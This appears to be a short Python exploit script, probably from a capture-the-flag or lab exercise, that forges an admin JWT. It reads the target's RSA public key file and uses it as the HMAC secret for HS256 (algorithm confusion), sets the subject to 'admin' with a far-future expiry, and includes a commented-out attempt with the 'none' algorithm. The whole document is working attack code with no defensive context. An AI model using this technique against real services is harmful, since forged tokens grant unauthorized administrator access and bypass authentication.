import jwt

PUBLIC_KEY = open("../jwt.key.pub", "r").read()

payload = {
  "sub": "admin",
  "exp": 9602085613,  # fill in any number you like
}

encoded = jwt.encode(payload, PUBLIC_KEY, algorithm='HS256')

print(encoded)

# algorithm none is unfeasible.
# print(jwt.encode(payload, key="", algorithm='none'))
